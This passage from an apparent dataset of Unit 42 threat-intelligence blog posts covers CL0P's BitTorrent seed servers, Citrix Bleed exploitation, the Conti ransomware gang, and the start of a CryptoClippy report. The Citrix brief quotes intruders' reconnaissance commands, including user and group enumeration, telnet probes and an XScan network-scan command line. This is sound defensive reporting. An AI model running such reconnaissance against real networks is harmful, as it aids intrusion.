qBittorrent 4.6.0 | | 198.44.136[.]216 | TDEHI | 100.0 | 0.0 | 0.0 | qBittorrent 4.5.4 | In both of these instances, there are multiple peers with 100% completion and so, on the surface, this information is useless.\nHowever, it becomes considerably less useless when you begin mapping out all the peers from hundreds of torrents.\nMapping Peers and Pokémon What you end up with after linking some of these data points is a web of connections that we can visualize for better analysis.\nFigure 5 focuses on three different data points: - The address of the peer - The victim - The client observed as in use From there, I connected each node based on the amount of observed data the peer had at the time of logging.\nThen I color-coded the links as shown in Figure 5, so the 100% links stand out.\nThis allows for quick inspection to identify addresses, which fall into one of three categories: - A confirmed original seeder - A potential original seeder - Nonoriginal seeders Looking at Charmander again you’ll note two gray lines pointing toward it.\nThese are sub-100% links (I coded all the 100% links red).\nThe blue links connect a peer to their observed client string, seen in Figure 6.\nBy going through the process of adding each host, when we switch from looking at the victim to the peers, patterns start to appear that draw immediate attention and make me feel like Charlie from Always Sunny in Philadelphia conspiratorially drawing connections!\nIf a host has all 100% links but a low volume, such as only 2-4, then I consider them a potential seeder.\nIf a host has all 100% links but a high volume, then I consider them just a potential original seeder.\nAny host who has any sub-100% links, I consider them a nonoriginal seeder.\nCircling back to the previous IP address 81.19.135[.]21 (shown in Figure 7) we can see what a highly probable original seeder looks like.\nA highly probable original seed is characterized not only by having a high volume of 100% seeds, but also by being the only logged peer for a number of victims.\nFurthermore, patterns start to emerge between the clusters of peers.\nFor example, the majority of hosts that I believe are original seeders all use the Transmission 3.00 client string, further binding their activity together.\nWhereas a host with a relatively unique client string that isn’t observed much (like the one in Figure 8) makes me lean more toward them being an entity that is just downloading all the data for other reasons, and that they have completed their downloads.\nAll this is to say that these data points allow me to then filter and weed out the less interesting peers quickly so that I can focus my attention on the ones that matter.\nThis individual shown in Figure 9 even changes their client string with every torrent.\nThis adds weight to the supposition that they are not an original seeder, even though they were seeding a lot of the data by the time I peered with them.\nBy looking at the data and applying the above logic, I’m able to overcome some of the previous issues we discussed, where I hadn’t started collecting data until after they started releasing the torrents.\nIn total, I was able to identify five hosts that I believe have a high likelihood of being original seeders in this dataset, along with two that will likely become future seeders.\nThis warranted a deeper dive.\nGotta Catch Em All!\nSeed Group 1 One pattern that stood out almost immediately was that three of the IP addresses are seemingly on the same network. -\n81.19.135[.]21 - 81.19.135[.]25 - 81.19.135[.]31 All three of these IP addresses exist within the same subnet on AS 209588 owned by FlyServers, which is a VPS hosting company.\nThe IPs are geolocated to Moscow, Russia.\nEach exhibits interesting characteristics that further connect them together making a strong case for them being actor controlled.\nFor example, note the pattern shown in Figures 10 and 11, as it relates to SSH availability and FTP availability for the first two IP addresses: For the IP ending in 21, SSH ports stopped responding on Aug. 6, 2023, and FTP ports started responding on Aug. 7, 2023.\nFor the IP ending in 25, we see SSH stop on Aug. 6, 2023, and FTP open on the same day.\nSimilarly, for the IP ending in 31 shown in Figure 12, while we did not have visibility of SSH, we can see the FTP also opened up on August 6.\nThe servers are running vsFTPd 3.0.3 and OpenSSH_8.4p1.\nThe brief visibility on TCP/8423 for the IP ending in 25 reveals it transitioned to running SSH on a nonstandard port.\nTo confirm the seeding servers were different entities, as opposed to being the same box behind some sort of load-balancing service, I looked at the TLS certificates in use by vsFTPd.\nThey were all self-signed: - 81.19.135[.]21 = 44102.example.ru, valid from Aug 06 2023 22:49:51 GMT-0400 - 81.19.135[.]25 = 14868.example.ru, valid from Aug 05 2023 23:48:55 GMT-0400 - 81.19.135[.]31 = 33916.example.ru, valid from Aug 05 2023 23:48:08 GMT-0400 I included the initial date for the certificate.\nAs you can see, they are roughly an hour apart from each other.\nThis implies that CL0P was prestaging these boxes about 10 days before they planned to release their first magnet links and five days before they publicly announced their intention to shift to this distribution method.\nUsing these patterns, I extended my search for certificates with an example.ru in their Common Name (CN) value that were observed to have FTP.\nI identified another host on this same subnet (shown in Figure 13) that exhibits similar features but has not yet shown up in the peering information.\nYou can see the same behavior where visibility is lost on the SSH port on Aug. 6, 2023, and the FTP port becomes active on Aug. 7, 2023.\nThis aligns with the rest of what we’ve observed. -\n81.19.135[.]11 = 43577.example.ru, valid from Aug 06 2023 23:03:31 GMT-0400 Also notable on this host is the presence of Windows services two months earlier, as shown in Figure 14.\nThis implies that the VPS was repurposed from Windows to a *nix-based machine within that time frame.\nThere is a lot of orchestration required to effectively host as much data as they’ve stolen.\nIt might be that the IP address ending in 11 is being prepped to host further victim files.\nThe two IP addresses ending in 25 and 31 have victims that were announced early in the release process, either on August 15 or a few days after.\nWhereas the IP address ending with 21 started to get usage on victim announcements beginning on August 24, and it has almost four times the number of observed victims as the others.\nThis could just be a result of my ability to observe them, but it could also imply something is different about this box.\nSeed Group 2 Another IP that stands out was also mentioned by Gary Warner on LinkedIn, who was looking at the same type of information regarding CL0P seeds.\nBelow is a snippet from his post: After Cl0p decided that no one was able to download their stolen data via .onion servers, they migrated to using bitTorrent.\nOf course the problem with using bitTorrent, is that it becomes painfully obvious where the bad guys are hosting the stolen data.\nIf one accesses the TORRENT and there is only one IP address offering 100% of the data, for the LARGER data sets, that is almost certainly hosting that the criminal acquired to serve the file from. (\nNot true for the tiny data sets -- for those the criminal can wait a short time for others to have 100% of the file and then disconnect their original location.)\nCurrently the main locations for \"100%\" sets are: 95.215.0[.]76 = AS34665 Petersburg Internet, St. Petersburg Russia (hosting company offerings at pindc[.]ru) I believe Highlander rules apply here and we might have to battle in a Pokémon gym later!\nThis IP address 95.215.0[.]76, shown in Figure 15, shares some similarities with the previous cluster.\nSpecifically the usage of a BitTorrent client with the string Transmission 3.00 was in use, and the hosting provider is another Russian company.\nSure enough, this seeding server (shown in Figure 16) exhibits behavior akin to the other cluster as it relates to services as well.\nHowever, the activity occurs almost a month before the other cluster.\nSSH services were observed up until July 17 and FTP services began appearing on July 18.\nThis is presumably an older box, and it also uses a different set of services to host FTP, leveraging ProFTPD.\nLikewise, the VPS is hosted in Saint Petersburg, Russia and it is announced from AS 34665 for Petersburg Internet Network (PIN) Datacenter.\nThis IP shares the below SSH Key with the IP address 95.215.1[.]221.\necdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNos5CNsQHUKlXJSFDJKtPB/4FlkqW6R0crEQaONn3TJ2TICxQRUTh8DgITlLcidJf0pnn0zVMWwE6PsWDI3eZU= While I have not yet observed this IP address as a peer in my collection, I don’t know whether this is due to a visibility issue or that the box has yet to be used for hosting.\nIt does share the same notable behavior with SSH and FTP, as shown in Figure 17.\nSeed Group 3 Applying these patterns to the other peers I’ve collected, the IP address 92.118.36[.]111 shown in Figure 18 stands out.\nIn this case, I’ve only observed it seeding a single torrent for Articuno at 100%.\nIt’s located in Amsterdam, announced from AS 209132 for StreamHost.\nWhere this torrent aligns is that it uses the Transmission 3.00 client string, and it has similar FTP access beginning on August 9 (as shown in Figure 19).\nOne last note I’ll make is that while searching for this IP address, I stumbled across an AbuseIPDB report for the next IP ending in 112, shown in Figure 20.\nIt showed a report of this address scanning for the MOVEit vulnerability in early June 2023, which is the vulnerability CL0P leveraged to steal all this data.\nWhether this is related or not is unknown, but it’s an interesting coincidence if not.\nConclusion By tracking and analyzing these types of shifts in leak site methodology, it gives us a unique insight into what a threat actor's mindset could be.\nBy understanding the problem they face and how they are trying to solve it, it provides us with an opportunity for further analysis and research.\nIn this case, the result of this research is a handful of hosting servers out of Russia that hold enormous amounts of stolen victim data.\nWe can expect much more to come in the following weeks.\nSeed boxes are always worth keeping an eye on.\nWhen the adversary's mind is focused elsewhere, it’s a ripe environment for mistakes that lead to leaving us vital clues.\nAs for their trade craft, we know these threat actors are likely leveraging FTP to transfer the stolen files to the seed boxes.\nWe also know that general visibility of SSH access shuts off immediately prior to the FTP services going live.\nThis could mean multiple things, but top of mind is that they are likely prestaging the stolen data on the servers for quite some time before they make the announcement of the magnet link.\nLikewise, the distribution of victim data across the seed boxes does not align with their announcement schedule.\nThis would add weight to the theory that the data has persisted on the box for a while prior to the torrent’s creation.\nThis could potentially be a technique they use to avoid seed tracking by having different victims announced at the same time yet seeded from different boxes.\nBefore I sign off, I want to provide some additional observations of the collected data as it stands on Aug. 30, 15 days after this activity began.\nThe total number of original seeders is five. -\n81.19.135[.]21 (20 observed victims) - 81.19.135[.]25 (5 observed victims) - 81.19.135[.]31 (6 observed victims) - 95.215.0[.]76 (9 observed victims) - 92.118.36[.]111 (1 observed victim) The total number of unobserved but likely seeders is two. -\n81.19.135[.]11 - 95.215.1[.]221 The total number of magnet links (each a victim): 192 The total number of successful 100% peering logs: 146 The total number of peers I connected with: 115 The top five peering clients for seeders are as follows: - qBittorrent 4.5.4 (9) - Transmission 3.00 (7) - qBittorrent 4.4.1 (4) - Transmission 2.9.3 (4) - µTorrent 3.6.0 (4) Figure 21 shows the distribution of peers, which is fairly global.\nWhile I was not able to obtain all the file meta data before identifying a 100% seed and disconnecting, I did collect stats on what I observed.\nIn total, I received file data of just 41 of the victims (less than one-third of what I observed) totaling over 1.1 TB of data.\nThe highest total file size I observed for any one victim was 127 GB with the low end being 2.8 MB and an average of 31 GB per victim.\nThere are many more victims to be released, and CL0P has remained relatively consistent in their release of their data, making good on all their threats.\nAdditionally, some torrents for “well-known Pokémon” (in this analogy) were much more popular than others.\nCompanies need to be aware that even if they do not pay the ransom, their data is a hot commodity for numerous reasons.\nNone of those reasons are likely to be in their best interest.\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members.\nCTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.\nLearn more about the Cyber Threat Alliance.\nProtections and Mitigations Palo Alto Networks customers can leverage a variety of product protections and updates to identify and defend against this threat.\nIf you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: - North America Toll-Free: 866.486.4842 (866.4.UNIT42) - EMEA: +31.20.299.3130 - APAC: +65.6983.8730 - Japan: +81.50.1790.0200 Cortex XDR and XSIAM Palo Alto Networks customers receive protection from CL0P ransomware and other malware through Cortex XDR.\nCortex XDR and XSIAM agents also help protect against post-exploitation activities associated with the MOVEit vulnerability using Behavioral Threat Protection, Anti-Webshell Protection and multiple additional security modules.\nAdditionally, Cortex Analytics has multiple detection models that help detect post-exploitation activities, with other relevant coverage by the Identity Analytics and Identity Threat Detection and Response (ITDR) modules.\nCortex Xpanse Cortex Xpanse customers can identify external facing instances of the application through the “MOVEit Transfer” attack surface rule.\nThe rule is available to all customers with a default state of “On.”\nCortex Xpanse has also released a new event in our Threat Response Center focused on the management of MOVEit exposures and additional remediation guidance and threat details related to MOVEit Transfer.\nAll Cortex Xpanse detection capabilities are also available for XSIAM customers who also have the ASM module.\nUpdated Jan. 11, 2024, at 11:34 a.m. PT.","num_sentences":195,"metadata":{"source":"blog","platform":"Unit42","filename":"CL0P-Seeds"}}
{"id":74,"title":"Threat Brief: Citrix Bleed CVE-2023-4966","publish_date":null,"link":"https://unit42.paloaltonetworks.com/threat-brief-cve-2023-4966-netscaler-citrix-bleed/","clean_text":"Executive Summary On Oct. 10, 2023, Citrix published a patch for their Netscaler ADC and Netscaler Gateway products.\nOne particular vulnerability that this patch is meant to mitigate has come to be known as Citrix Bleed (CVE-2023-4966).\nThis nickname was given because the vulnerability can leak sensitive information from the device’s memory, which can include session tokens.\nAttackers can then use these credentials to gain a foothold into systems via session hijacking.\nAt the time of the patch, Citrix was unaware of ongoing attacks using this vulnerability but has since stated that they have observed threat actors using it.\nThe Unit 42 Incident Response and Managed Threat Hunting teams have observed ransomware groups exploiting Citrix Bleed.\nThe Managed Threat Hunting team has also observed what appeared to be remote executions from Netscaler gateways in association with exploitation of this vulnerability.\nUsing Cortex Xpanse device signature data, our researchers observed nearly 8,000 IP addresses advertising a vulnerable version of NetScaler Gateway and 6,000 IPs advertising NetScaler ADC devices.\nThe largest number (3,100) of these devices are located in the United States, 800 are in Germany, 450 in China and 400 in the United Kingdom.\nPalo Alto Networks customers receive protection from and mitigation for CVE-2023-4966 in the following ways: - Organizations can engage the Unit 42 Incident Response team for specific assistance with this threat and others. -\nThe Unit 42 Managed Threat Hunting team can be engaged to continuously hunt for this and other threats hiding in your infrastructure. -\nThe Next-Generation Firewall with the Advanced Threat Prevention security subscription can help block the attacks with best practices. -\nThe Advanced WildFire machine-learning models and analysis techniques have been reviewed and updated in light of Citrix Bleed. -\nCortex Xpanse has published a new Threat Response Event for CVE-2023-4966 that can help identify generally exposed instances and those with known insecure versions. -\nCortex XDR and XSIAM help detect and protect against post-exploitation activities.\nPalo Alto Networks also recommends patching against this vulnerability as well as CVE-2023-4967, with the software update provided by Citrix.\n| Vulnerabilities Discussed | CVE-2023-4966 | Details of the Vulnerability Citrix Bleed (CVE-2023-4966) is a sensitive information disclosure vulnerability affecting Citrix Netscaler Gateway and Netscaler ADC products with a CVSS score of 9.4.\nIt was patched by Citrix on Oct. 10, 2023.\nThis vulnerability can allow an unauthenticated attacker to steal session tokens via a specially crafted request and gain access to vulnerable systems.\nThere was also a publication from security firm Assetnote that provides specific details as well as proof of concept (PoC) code to exploit this vulnerability.\nCitrix reports that the following products are affected by this vulnerability: - NetScaler ADC and NetScaler Gateway 14.1 before 14.1-8.50 - NetScaler ADC and NetScaler Gateway 13.1 before 13.1-49.15 - NetScaler ADC and NetScaler Gateway 13.0 before 13.0-92.19 - NetScaler ADC 13.1-FIPS before 13.1-37.164 - NetScaler ADC 12.1-FIPS before 12.1-55.300 - NetScaler ADC 12.1-NDcPP before 12.1-55.300 CVE-2023-4966 has also recently been added to the CISA Known Exploited Vulnerabilities Catalog.\nThis catalog contains vulnerabilities that are known to be frequent vectors of attack.\nCurrent Scope of the Attack At the time of patch publication for CVE-2023-4966, Citrix stated that the vulnerability had been found internally and that they were unaware of attacks targeting it.\nHowever, they have since stated that they have received reports of attacks using this vulnerability for session hijacking.\nAs such, they have advised people to immediately apply the patch to affected devices.\nThere are also public reports of various attackers using this vulnerability to hijack session tokens and use them to gain access.\nIt’s also been reported that Python scripts have been distributed to ransomware affiliates to exploit and gain access to victim networks.\nThe combination of these sensitive access systems and publicly available PoC code makes the exposure of this vulnerability extremely sensitive.\nThe Unit 42 Incident Response and Managed Threat Hunting teams have observed ransomware groups exploiting Citrix Bleed.\nAdditional MTH observations are described in the following section.\nUnit 42 Managed Threat Hunting Observations The Unit 42 Managed Threat Hunting team observed multiple compromised users executing reconnaissance commands and dropping additional tooling on VDI hosts.\nThis activity appeared to be remote executions from Netscaler gateways that were potentially exploited by threat actors.\nIn this incident, we observed remote PowerShell sessions that spawned cmd.exe and executed various reconnaissance commands, such as the following: - \"C:\\Windows\\system32\\whoami.exe\" /all - \"C:\\Windows\\System32\\Wbem\\WMIC.exe\" qfc get - C:\\Windows\\system32\\cmd.exe /c tasklist /FI \"windowtitle eq Telnet REDACTED_INTERNAL_IP\"|findstr \"cmd.exe\" - cmd.exe /k \"echo q|telnet REDACTED_INTERNAL_IP 80&exit\" - cmd /c \"ping -n 1 -w 1 REDACTED_INTERNAL_IP && echo true || echo false\"| - taskkill /f /im cmd.exe - net localgroup administradores - net user administrador In addition, the threat actor downloaded multiple tools into the VDI hosts, using Chrome or Microsoft Edge browsers.\nAmong the tools, we observed the following: - A binary called s.exe, which appeared to be XScan, a red teaming tool developed by Xteam that is capable of scanning vulnerabilities: - s.exe -h REDACTED_INTERNAL_IP/24 -finger -vulnscan -webtimeout 6 -t 100 -debug - An attempt to start a simple HTTP server listening on port 8000: - python -m http.server 8000 - Installation of mRemoteNG, a utility designed for handling remote connections to other systems: - \"C:\\Windows\\System32\\msiexec.exe\" /i - \"C:\\Users\\Public\\Libraries\\mRemoteNG-Installer-1.76.20.24615.msi\" While this activity took place over the course of a week, the threat actor did not manage to move laterally outside of the VDI hosts.\nInterim Guidance Citrix has advised that there is no workaround for this vulnerability and strongly recommends patching the affected software immediately.\nUnit 42 recommends prioritizing public-facing Netscaler Gateway and Netscaler ADC instances and applying patches to the affected products immediately.\nConclusion Due to the ease of exploitation caused by the publicly availability of PoC code and the internet facing posture of these products, Palo Alto Networks recommends following Citrix’s guidance and immediately patching affected Citrix Netscaler products.\nPrioritize public-facing instances of these products or consider disabling if a patch cannot be immediately applied.\nPalo Alto Networks and Unit 42 will continue to monitor the situation for updated information.\nPalo Alto Networks customers receive protection from our products, as listed below.\nWe will update this threat brief as more relevant information becomes available.\nPalo Alto Networks Product Protections for Citrix Bleed Palo Alto Networks customers can leverage a variety of product protections and updates to identify and defend against this threat.\nIf you think you might have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: - North America Toll-Free: 866.486.4842 (866.4.UNIT42) - EMEA: +31.20.299.3130 - APAC: +65.6983.8730 - Japan: +81.50.1790.0200 Unit 42 Managed Threat Hunting Recommendations By installing Cortex XDR agents on Citrix guests, VDI instances and widely throughout the environment, Cortex XDR will be able to provide detection, prevention and telemetry for any activity or attempted lateral movement that occurs after exploitation.\nThe Unit 42 MTH team can be engaged to continuously hunt for threats hiding in your infrastructure, allowing you to take action before damage occurs.\nNext-Generation Firewalls and Prisma Access With Advanced Threat Prevention Next-Generation Firewall with the Advanced Threat Prevention security subscription can help block the attacks with best practices via the following Threat Prevention signature: 94483 Advanced WildFire The Advanced WildFire machine-learning models and analysis techniques have been reviewed and updated in light of Citrix Bleed.\nCortex Xpanse Cortex Xpanse has published a new Threat Response Event for CVE-2023-4966 that includes Attack Surface Rules for detecting Citrix Netscaler Gateway and Citrix Netscaler ADC, as shown in Figure 1.\nThis Threat Response Event can identify both generally exposed instances and those with known insecure versions.\nCortex XDR and XSIAM Cortex XDR and XSIAM agents help detect and protect against post-exploitation activities using the agent protection modules such as Behavioral Threat Protection, Anti-Webshell Protection, Credential Gathering Protection, analytics and more.\nXSIAM customers with the ASM module can also take advantage of the Cortex Xpanse detection capabilities outlined above.\nIndicators of Compromise - C:\\Users\\Public\\Documents\\s.exe - XScan - C:\\Users\\Public\\Documents\\dsquery.exe - Tool designed to search for an active directory objects - C:\\Users\\Public\\Documents\\dsget.exe - Tool designed to view active directory objects - C:\\Users\\Public\\Libraries\\7z2301-x64.exe - 7zipinstall - C:\\Users\\Public\\Libraries\\mRemoteNG-Installer-1.76.20.24615.msi - C:\\Users\\Public\\Libraries\\python-3.12.0-amd64.exe - Python installed","num_sentences":50,"metadata":{"source":"blog","platform":"Unit42","filename":"Citrix-Bleed"}}
{"id":75,"title":"Conti Ransomware Gang: An Overview","publish_date":"2025-03-28","link":"https://www.paloaltonetworks.com/search/unit42search#q=Conti","clean_text":"Executive Summary Conti ransomware stands out as one of the most ruthless of the dozens of ransomware gangs that we follow.\nThe group has spent more than a year attacking organizations where IT outages can have life-threatening consequences: hospitals, 911 dispatch carriers, emergency medical services and law enforcement agencies.\nIreland has yet to recover from an attack in mid-May that prompted the shutdown of the entire information technology network of the nation's healthcare system – prompting cancellation of appointments, the shutdown of X-ray systems and delays in COVID testing.\nConti also stands out as unreliable.\nWe've seen the group stiff victims who pay ransoms, expecting to be able to recover their data.\nThe FBI has connected Conti to more than 400 cyberattacks against organizations worldwide, three-quarters of which are based in the U.S., with demands as high as $25 million.\nThis makes Conti one of the greediest groups out there.\nIf you think you may have been impacted, please email unit42-investigations@paloaltonetworks.com or call (866) 4-UNIT42 to get in touch with the Unit 42 Incident Response team.\nConti Ransomware Overview We’ve followed Conti for more than a year through our work helping organizations respond to ransomware attacks.\nIt appears to be one of many private cybercrime groups that have set up their operations by leveraging the booming ransomware-as-a-service (RaaS) ecosystem.\nSuch gangs obtain their foothold in the networks of their victims by purchasing access from other threat actors, who sell it as a commodity.\nThey can also procure infrastructure, malware, communications tools and money laundering from other RaaS providers.\nMost of these actors use the same methods of access found in many ransomware attacks, such as phishing emails and exploiting unprotected internet-facing applications, the lack of multi-factor authentication (MFA), as well as the typical avenues used to preserve and enhance access once it’s achieved, such as through the use of Cobalt Strike or PowerShell.\nThese approaches are not particularly clever or sophisticated, but often they are effective.\nConti’s methodology often follows the “double extortion” approach that many leading ransomware groups are presently using.\nWhen using double extortion, attackers will not only lock up a victim’s files and demand ransom, but they will also steal files and threaten to publish them on a website or otherwise leak them if their initial ransom demand is not met.\nBut Conti’s methods do have atypical elements.\nUsually, the more successful ransomware operators put a lot of effort into establishing and maintaining some semblance of “integrity” as a way of facilitating ransom payments from victims.\nThey want to establish stellar reputations for “customer service” and for delivering on what they promise – that if you pay a ransom, your files will be decrypted (and they will not appear on a leak website).\nYet in our experience helping clients remediate attacks, Conti has not demonstrated any signs that it cares about its reputation with would-be victims.\nIn one recent case, Conti did not return a client’s files who had paid the ransom.\nThis client got only a small fraction of the file restorations that were promised before the Conti ransomware representatives disappeared back into the dark web.\nIn another case, our client needed an inventory of all files accessed, so that they could notify parties whose data was affected.\nConti agreed to share that information if a payment was made, then changed their minds, saying, “We do not own that data anymore.\nIt was deleted and there is no chance to restore it.”\nLike many ransomware gangs, Conti is constantly adapting to changes, including recent heightened scrutiny by law enforcement and policy makers following high-profile disruptive attacks on the Colonial pipeline and healthcare organizations.\nWhen Ireland's healthcare system refused to pay any ransom, Conti provided the agency with what it said was a free decryption key.\nBut there was a twist: The group maintained that it would still make good on its \"double extortion\" threat to publish stolen data on its leak site.\nConclusion Unfortunately, keeping Conti out of your network often isn’t simple.\nA primary means of infection appears to be through phishing scams, and attackers are constantly upping their game in this area.\nWhile phishing emails used to be pretty easy for almost anyone to spot, particularly after some awareness training, we are seeing increasingly sophisticated attacks in which the threat actors have done plenty of homework on their intended victims.\nSometimes they’ll send a blitz of scam emails to employees throughout an organization, and it takes only one to open the attachment and release the malware into the network.\nRansomware attacks are getting easier to unleash, and the rewards to the attackers are still growing by leaps and bounds.\nAccordingly, it continues to be a growth industry that will attract multitudes of new practitioners, and it is likely that high-profile targets will continue to fall.\nPalo Alto Networks detects and prevents Conti ransomware in the following ways: - WildFire: All known samples are identified as malware. -\nCortex XDR with: - Indicators for Conti ransomware. -\nAnti-Ransomware Module to detect Conti ransomware encryption behaviors. -\nLocal Analysis detection for Conti binaries. -\nNext-Generation Firewalls: DNS Signatures detect the known Conti ransomware command and control (C2) domains, which are also categorized as malware in Advanced URL Filtering. -\nAutoFocus: Tracking related activity using the Conti tag. -\nUnit 42 Security Consulting: The Ransomware Readiness Assessment detects any hidden threats, tests for preparedness and provides remediation recommendations.\nAdditionally, Indicators of Compromise (IoCs) associated with Conti are available on GitHub, and have been published to the Unit 42 TAXII feed.\nCourses of Action | Product / Service | Course of Action | | Initial Access | | | The below courses of action mitigate the following techniques: Exploit Public-Facing Application [T1190], Spearphishing Attachment [T1566.001] | | | Threat Prevention† | Ensure a secure Vulnerability Protection Profile is applied to all security rules allowing traffic | | Ensure a Vulnerability Protection Profile is set to block attacks against critical and high vulnerabilities, and set to default on medium, low and informational vulnerabilities | | | Ensure that antivirus profiles are set to block on all decoders except 'imap' and 'pop3' | | | Ensure a secure antivirus profile is applied to all relevant security policies | | | Wildfire† | Ensure forwarding is enabled for all applications and file types in WildFire file blocking profiles | | Ensure that WildFire file size upload limits are maximized | | | Ensure a WildFire Analysis profile is enabled for all security policies | | | Ensure forwarding of decrypted content to WildFire is enabled | | | Ensure all WildFire session information settings are enabled | | | Ensure alerts are enabled for malicious files detected by WildFire | | | Ensure 'WildFire Update Schedule' is set to download and install updates every minute | | | Cortex XSOAR | Deploy XSOAR Playbook Cortex XDR - Isolate Endpoint | | Deploy XSOAR Playbook - Endpoint Malware Investigation | | | Deploy XSOAR Playbook - Phishing Investigation - Generic V2 | | | Execution | | | The below courses of action mitigate the following techniques: | | | Cortex XDR | Enable Anti-Exploit Protection | | Enable Anti-Malware Protection | | | Privilege Escalation, Defense Evasion | | | The below courses of action mitigate the following techniques: Deobfuscate/Decode Files or Information [T1140], Obfuscated Files or Information [T1027], Dynamic-link Library Injection [T1055.001] | | | Wildfire † | Ensure forwarding is enabled for all applications and file types in WildFire file blocking profiles | | Ensure alerts are enabled for malicious files detected by WildFire | | | Ensure forwarding of decrypted content to WildFire is enabled | | | Ensure all WildFire session information settings are enabled | | | Ensure a WildFire Analysis profile is enabled for all security policies | | | Ensure that WildFire file size upload limits are maximized | | | Ensure 'WildFire Update Schedule' is set to download and install updates every minute | | | Cortex XDR | Enable Anti-Malware Protection | | Enable Anti-Exploit Protection | | | Discovery | | | The below courses of action mitigate the following techniques: File and Directory Discovery [T1083], Network Share Discovery [T1135], Process Discovery [T1057], System Network Configuration Discovery [T1016], System Network Connections Discovery [T1049] | | | Cortex XDR | XDR monitors for behavioral events via BIOCs along a causality chain to identify discovery behaviors* | | Lateral Movement | | | The below courses of action mitigate the following techniques: SMB/Windows Admin Shares [T1021.002], Taint Shared Content [T1080] | | | Threat Prevention † | Ensure a secure antivirus profile is applied to all relevant security policies | | Cortex XDR | Enable Anti-Malware Protection | | Enable Anti-Exploit Protection | | | Impact | | | The below courses of action mitigate the following techniques: Data Encrypted for Impact [T1486], Inhibit System Recovery [T1490], Service Stop [T1489] | | | Cortex XSOAR | Deploy XSOAR Playbook - Ransomware Manual for incident response.\n| | Deploy XSOAR Playbook - Palo Alto Networks Endpoint Malware Investigation | | | Cortex XDR | Enable Anti-Malware Protection | | Look for the following BIOCs alerts to detect activity*: Manipulation of Volume Shadow Copy configuration | Table 1.\nCourses of Action for Conti ransomware.\n†These capabilities are part of the NGFW security subscriptions service. *\nThese analytic detectors will trigger automatically for Cortex XDR Pro customers.","num_sentences":47,"metadata":{"source":"blog","platform":"Unit42","filename":"Conti"}}
{"id":76,"title":"CryptoClippy Speaks Portuguese","publish_date":null,"link":"https://unit42.paloaltonetworks.com/crypto-clipper-targets-portuguese-speakers/","clean_text":"Executive Summary Unit 42 recently discovered a malware campaign targeting Portuguese speakers, which aims to redirect cryptocurrency away from legitimate users’ wallets and into wallets controlled by threat actors instead.\nTo do this, the campaign uses a type of malware known as a cryptocurrency clipper, which monitors the victim’s clipboard for signs that a cryptocurrency wallet address is being copied.\nThe malware, which we call CryptoClippy, seeks to replace the user’s actual wallet address with the threat actor’s, causing the user to inadvertently send cryptocurrency to the threat actor.\nUnit 42 Managed Threat Hunting found victims across manufacturing, IT services, and real estate industries, though they likely impacted the personal wallet addresses of someone using their work machine.\nTo deliver the malware to users’ computers, threat actors in this campaign used both Google Ads and traffic distribution systems (TDS) to redirect victims to malicious domains that are impersonating the legitimate WhatsApp Web application.\nThey use this to ensure victims are real users, and also that they’re Portuguese speakers.\nFor users who are sent to malicious domains, the threat attempts to trick them into downloading malicious files, including either .zip or .exe files, that lead to the final payload.\nPalo Alto Networks customers receive protections against this campaign through Cortex XDR.\nThe Advanced URL Filtering and DNS Security cloud-delivered security services for the Next-Generation Firewall identify domains associated with the CryptoClippy campaign as malicious.\n| Related Unit 42 Topics | Cryptocurrency, Bitcoin | What Are Cryptocurrency Clippers?\nCryptocurrency malware aims to redirect cryptocurrency funds away from legitimate users’ wallets and into wallets that are controlled by the threat actor.\nWhen a computer is infected with a cryptocurrency clipper, the malware continually examines the victim’s clipboard to see if they have copied a cryptocurrency wallet address.\nThe idea behind this is that if a person copies a wallet address to the clipboard, it indicates they might be in the process of transferring cryptocurrency from one wallet to another.\nThe clipper malware uses regular expressions (regexes) to identify what type of cryptocurrency the address pertains to.\nIt then replaces the clipboard entry with a visually similar but adversary-controlled wallet address for the appropriate cryptocurrency.\nLater, when the victim pastes the address from the clipboard to conduct a transaction, they actually are sending cryptocurrency directly to the threat actor.\nSince wallet addresses typically are very long – sometimes exceeding 40 alphanumeric characters – many people will not notice this change in address.\nThis contributes to the effectiveness of clipper malware.\nCryptoClippy Overview Unit 42 Managed Threat Hunting found victims across manufacturing, IT services, and real estate industries.\nThis threat does not target specific industries, and the devices impacted were hit opportunistically.\nA CryptoClippy infection begins with SEO poisoning, so that when a person searches for “WhatsApp Web,” the result leads them to a threat actor-controlled domain.\nOnce there, victims are prompted to download a .zip file that contains a .lnk file, which is composed of malicious scripts.\nThese scripts set off a chain of events that installs the clipper malware.\nThis threat then monitors the victim’s clipboard activity for bitcoin transactions, such that their valid crypto wallet address will be replaced with one controlled by the threat actor.\nThe variant of CryptoClippy we investigated has a variety of additional capabilities to help the threat actor accomplish their crypto stealing activities.\nThis includes being able to establish a Remote Desktop Protocol (RDP) backdoor through execution of an RC4-encrypted PowerShell script.\nThis script contains elements of Windows Management Instrumentation (WMI), terminal service registry manipulation, icacls, net commands and log clearing.\nThese allow the attackers to maintain access outside the in-memory payload.\nIn addition, the variant also has functionality related to targeting Ethereum and bitcoin cryptocurrency wallets.\nThis is not surprising, given the growing popularity of digital currencies in Latin America.\nAt the time of writing this post, the actor controlled wallets show recent activity.\nThe bitcoin address has shown evidence of receiving 0.039954 BTC, which roughly equals $982.83.\nThis bitcoin (BTC) balance came from four different BTC transactions.\nThe Ethereum (ETH) address shows evidence of having received funds as well, with 0.110915556631181819 ETH (roughly equal to $186.32) being sent from three different ETH addresses.\nThe threat actors in this campaign employed a multi-stage approach to try to bypass signature- and heuristic-based security engines.\nThis approach included obfuscation techniques to evade detection, including using obfuscated PowerShell scripts and encoded payloads.\nThe current low detection rate of this malware highlights this approach's effectiveness, as only a handful of vendors appear to be detecting this malware in VirusTotal.\nThe vendors that do detect this have assigned generic names to this malware.\nInfection Chain for CryptoClippy The infection flow for CryptoClippy starts with delivering an initial .zip file that contains a .lnk file that is composed of an obfuscated PowerShell command line script.\nOnce the .lnk file is double-clicked by the victim, the PowerShell script will be executed, which will download the second stage and several obfuscated/encrypted payloads (as discussed later in Stage 1 - Loader).\nWhen the second stage PowerShell script is executed, it deobfuscates/decrypts the CryptoClippy loader and executes it.\nThe loader will then inject its stealer component into svchost.exe.\nCryptoClippy will set up user-mode event based hooks and a callback function into clipboard APIs to replace the victim’s Ethereum/bitcoin 